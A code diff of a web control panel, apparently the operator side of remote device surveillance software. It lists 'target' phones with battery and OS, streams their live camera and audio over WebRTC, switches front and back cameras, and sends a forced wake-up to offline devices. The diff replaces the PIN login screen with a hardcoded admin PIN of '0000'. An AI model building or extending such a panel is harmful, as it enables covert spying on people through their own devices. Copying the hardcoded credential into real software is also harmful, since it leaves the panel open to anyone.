@@ -1,140 +1,97 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>LEO ADMIN - COMMAND HUB PRO</title>
+    <title>LEO HUB PRO - SMOOTH VIEW</title>
     <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; --offline: #ff4444; }
-        * { box-sizing: border-box; }
-        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; overflow: hidden; }
+        :root { --blue: #00d4ff; --dark: #050a14; --panel: #0a192f; --neon: #00ff9d; }
+        * { box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+        body { background: var(--dark); color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; height: 100vh; flex-direction: row; }
         
-        /* Sidebar with Persistent History */
-        .sidebar { width: 300px; background: var(--panel); padding: 20px; border-right: 1px solid #1e3a8a; overflow-y: auto; }
-        .user-item { background: #112240; padding: 15px; margin: 10px 0; border-radius: 12px; cursor: pointer; border: 2px solid transparent; position: relative; transition: 0.3s; }
-        .user-item.active { border-color: var(--blue); box-shadow: 0 0 10px var(--blue); }
-        .user-item.online { border-left: 5px solid var(--neon); }
-        .user-item.offline { border-left: 5px solid var(--offline); opacity: 0.7; }
-        
-        .status-tag { font-size: 0.6rem; font-weight: bold; position: absolute; top: 8px; right: 12px; letter-spacing: 1px; }
+        /* Sidebar Responsive */
+        .sidebar { width: 280px; background: var(--panel); padding: 15px; border-right: 1px solid #1e3a8a; overflow-y: auto; flex-shrink: 0; }
+        .user-item { background: #112240; padding: 12px; margin: 8px 0; border-radius: 10px; cursor: pointer; border: 1px solid transparent; position: relative; transition: 0.2s; }
+        .user-item.active { border-color: var(--blue); background: #162a4d; box-shadow: 0 0 10px rgba(0,212,255,0.2); }
+        .user-item.online { border-left: 4px solid var(--neon); }
+        .user-item.offline { border-left: 4px solid #ff4444; opacity: 0.6; }
 
-        /* Main View */
-        .main { flex: 1; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .video-box { width: 100%; max-width: 850px; aspect-ratio: 16/9; background: #000; border: 2px solid var(--blue); border-radius: 15px; overflow: hidden; position: relative; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
-        video { width: 100%; height: 100%; object-fit: contain; }
+        /* Main Viewport */
+        .main { flex: 1; display: flex; flex-direction: column; height: 100vh; position: relative; background: #000; }
+        .top-bar { padding: 10px 20px; background: var(--panel); display: flex; justify-content: space-between; align-items: center; font-size: 0.8rem; border-bottom: 1px solid #1e3a8a; }
         
-        /* Command Buttons */
-        .controls { margin-top: 20px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; width: 100%; max-width: 550px; }
-        .btn { background: #112240; border: 1px solid var(--blue); color: var(--blue); padding: 14px; border-radius: 8px; cursor: pointer; font-weight: bold; transition: 0.2s; }
-        .btn:hover { background: var(--blue); color: var(--dark); }
-        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; margin-bottom: 5px; font-size: 1rem; box-shadow: 0 0 15px rgba(0,255,157,0.3); }
+        /* Video Container - AUTO ADJUST */
+        .video-box { flex: 1; display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; background: #000; }
+        video { width: 100%; height: 100%; object-fit: contain; /* Isse poora view dikhega bina kute */ }
         
-        #login { position: fixed; inset: 0; background: var(--dark); display: flex; align-items: center; justify-content: center; z-index: 100; }
-        .info-tag { font-size: 0.7rem; color: #8892b0; margin-top: 5px; }
-        .hidden { display: none !important; }
+        /* Floating Controls */
+        .controls-overlay { position: absolute; bottom: 20px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 500px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px; z-index: 10; }
+        .btn { background: rgba(16, 34, 64, 0.9); border: 1px solid var(--blue); color: var(--blue); padding: 12px; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 0.75rem; backdrop-filter: blur(5px); }
+        .btn-wake { background: var(--neon); color: #000; border: none; grid-column: span 2; font-size: 0.9rem; }
+        
+        #audio-indicator { position: absolute; top: 20px; right: 20px; background: rgba(255,0,0,0.7); padding: 8px 15px; border-radius: 20px; font-size: 0.7rem; cursor: pointer; z-index: 11; }
+        
+        @media (max-width: 768px) {
+            body { flex-direction: column; }
+            .sidebar { width: 100%; height: 180px; border-right: none; border-bottom: 1px solid #1e3a8a; }
+        }
     </style>
-    </head>
+</head>
 <body>
-    <!-- Login Screen -->
-    <div id="login">
-        <div style="text-align: center;">
-            <h2 style="color: var(--blue); letter-spacing: 2px;">SYSTEM HUB LOGIN</h2>
-            <input type="password" id="pin" placeholder="ENTER ACCESS PIN" style="padding:12px; background:#111; color:white; border:1px solid var(--blue); border-radius:8px; width: 250px; text-align: center; outline: none;">
-            <br>
-            <button onclick="auth()" class="btn" style="margin-top:15px; width:100%;">AUTHORIZE</button>
-        </div>
-    </div>
-
-    <!-- Persistent Sidebar -->
     <div class="sidebar">
-        <h3 style="color: var(--blue); border-bottom: 1px solid #1e3a8a; padding-bottom: 10px;">DEVICES HISTORY</h3>
-        <div id="user-list">
-            <p style="color: #444; font-size: 0.9rem;">Waiting for devices...</p>
-        </div>
+        <h3 style="color: var(--blue); font-size: 1rem; margin-top: 0;">DEVICES</h3>
+        <div id="user-list"></div>
     </div>
 
-    <!-- Main Control Area -->
     <div class="main">
-        <div style="width: 100%; display: flex; justify-content: space-between; margin-bottom: 15px; font-size: 0.8rem; color: #8892b0; border-bottom: 1px solid #1e3a8a; padding-bottom: 10px;">
-            <div>HUB: <span style="color:var(--neon);">ENCRYPTED ONLINE</span></div>
-            <div>ACTIVE TARGET: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
+        <div class="top-bar">
+            <div>HUB: <span style="color:var(--neon);">SECURE</span></div>
+            <div>DEVICE: <span id="cur-id" style="color:var(--blue);">NONE</span></div>
         </div>
 
         <div class="video-box">
             <video id="remoteVideo" autoplay playsinline></video>
-            <div id="audio-btn" style="position:absolute; bottom:15px; right:15px; background:rgba(255,0,0,0.8); padding:8px 15px; border-radius:30px; cursor:pointer; font-size: 0.7rem; font-weight: bold; color: #fff;" onclick="unmute()">🔊 UNMUTE AUDIO</div>
+            <div id="audio-indicator" onclick="unmute()">🔊 CLICK TO UNMUTE</div>
         </div>
 
-        <div class="controls">
-            <!-- FORCE WAKE UP: Offline device ko trigger karne ke liye -->
-            <button class="btn btn-wake" onclick="sendCommand('wake-up')">⚡ FORCE WAKE UP / RECONNECT DEVICE</button>
-            <button class="btn" onclick="sendCommand('front')">FRONT CAMERA</button>
-            <button class="btn" onclick="sendCommand('back')">BACK CAMERA</button>
-            <button class="btn" onclick="refreshHub()">REFRESH STREAM</button>
-            <button class="btn" style="color:var(--offline); border-color:var(--offline);" onclick="location.reload()">FULL SYSTEM RESET</button>
+        <div class="controls-overlay">
+            <button class="btn btn-wake" onclick="sendCommand('wake-up')">⚡ FORCE WAKE-UP DEVICE</button>
+            <button class="btn" onclick="sendCommand('front')">FRONT CAM</button>
+            <button class="btn" onclick="sendCommand('back')">BACK CAM</button>
+            <button class="btn" onclick="refreshStream()">REFRESH</button>
+            <button class="btn" style="color:#ff4444; border-color:#ff4444;" onclick="location.reload()">RESET</button>
         </div>
     </div>
 
     <script>
         const socket = io();
-        let currentTarget = null, pc;
-        let deviceHistory = {}; // Local storage for this session
+        let currentTarget = null, pc, history = {};
         const config = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
 
-        function auth() { socket.emit('admin-join', document.getElementById('pin').value); }
-        socket.on('admin-status', (r) => { if(r.success) document.getElementById('login').classList.add('hidden'); else alert("PIN INCORRECT"); });
+        socket.emit('admin-join', "0000");
+        socket.on('admin-status', (r) => { if(!r.success) alert("WRONG PIN"); });
 
-        // Logic: Online devices update karo aur Offline ko history mein rakho
-        socket.on('update-targets', (activeList) => {
-            // Pehle sabko offline mark karo
-            for (let id in deviceHistory) { deviceHistory[id].status = 'offline'; }
-
-            // Jo active hain unhe online karo
-            activeList.forEach(target => {
-                deviceHistory[target.id] = {
-                    id: target.id,
-                    battery: target.battery,
-                    device: target.device,
-                    status: 'online'
-                };
+        socket.on('update-targets', (list) => {
+            for (let id in history) history[id].status = 'offline';
+            list.forEach(t => {
+                history[t.id] = { id: t.id, battery: t.battery, device: t.device, status: 'online' };
             });
-            renderUI();
+            renderList();
         });
 
-        function renderUI() {
-            const listDiv = document.getElementById('user-list');
-            listDiv.innerHTML = "";
-            
-            // Sort: Online devices upar aayenge
-            const ids = Object.keys(deviceHistory).sort((a,b) => (deviceHistory[b].status === 'online') - (deviceHistory[a].status === 'online'));
-            ids.forEach(id => {
-                const dev = deviceHistory[id];
-                const d = document.createElement('div');
-                d.className = `user-item ${currentTarget === id ? 'active' : ''} ${dev.status}`;
-                d.innerHTML = `
-                    <span class="status-tag" style="color:${dev.status==='online'?'var(--neon)':'var(--offline)'}">
-                        ${dev.status.toUpperCase()}
-                    </span>
-                    <strong>Device_${id.substring(0,4)}</strong>
-                    <div class="info-tag">OS: ${dev.device} | Bat: ${dev.battery}</div>
-                `;
-                d.onclick = () => {
-                    currentTarget = id;
-                    document.getElementById('cur-id').innerText = id.substring(0,8);
-                    renderUI(); // Refresh active state
-                    if(dev.status === 'online') select(id);
-                };
-                listDiv.appendChild(d);
+        function renderList() {
+            const div = document.getElementById('user-list');
+            div.innerHTML = "";
+            Object.keys(history).forEach(id => {
+                const dev = history[id];
+                const item = document.createElement('div');
+                item.className = `user-item ${currentTarget === id ? 'active' : ''} ${dev.status}`;
+                item.innerHTML = `<strong>Device_${id.substring(0,4)}</strong><br>
+                                  <div style="font-size:0.65rem; color:#8892b0;">Bat: ${dev.battery} | ${dev.status.toUpperCase()}</div>`;
+                item.onclick = () => { currentTarget = id; document.getElementById('cur-id').innerText = id.substring(0,6); renderList(); if(dev.status === 'online') select(id); };
+                div.appendChild(item);
             });
         }
-
-        function unmute() { 
-            const v = document.getElementById('remoteVideo'); 
-            v.muted = false; 
-            v.play().catch(e => {}); 
-            document.getElementById('audio-btn').classList.add('hidden'); 
-        }
-
-        function refreshHub() { if(currentTarget && deviceHistory[currentTarget].status === 'online') select(currentTarget); }
 
         async function select(id) {
             if(pc) pc.close();
@@ -143,6 +100,11 @@
             pc.ontrack = (e) => { document.getElementById('remoteVideo').srcObject = e.streams[0]; };
             socket.emit('command', { targetId: id, cmd: 'start' });
         }
+
+        function unmute() { const v = document.getElementById('remoteVideo'); v.muted = false; v.play(); document.getElementById('audio-indicator').style.display='none'; }
+        function refreshStream() { if(currentTarget) select(currentTarget); }
+        function sendCommand(c) { if(!currentTarget) return alert("Select device!"); socket.emit('command', { targetId: currentTarget, cmd: c }); }
+
         socket.on('signal', async (d) => {
             if(d.from !== currentTarget) return;
             if(d.signal.sdp) {
@@ -152,13 +114,8 @@
                     await pc.setLocalDescription(ans);
                     socket.emit('signal', { to: d.from, signal: { sdp: ans } });
                 }
-            } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
+                } else if(d.signal.candidate) pc.addIceCandidate(new RTCIceCandidate(d.signal.candidate));
         });
-
-        function sendCommand(c) { 
-            if(!currentTarget) return alert("PLEASE SELECT A DEVICE FROM HISTORY!");
-            socket.emit('command', { targetId: currentTarget, cmd: c }); 
-        }
     </script>
 </body>
 </html>
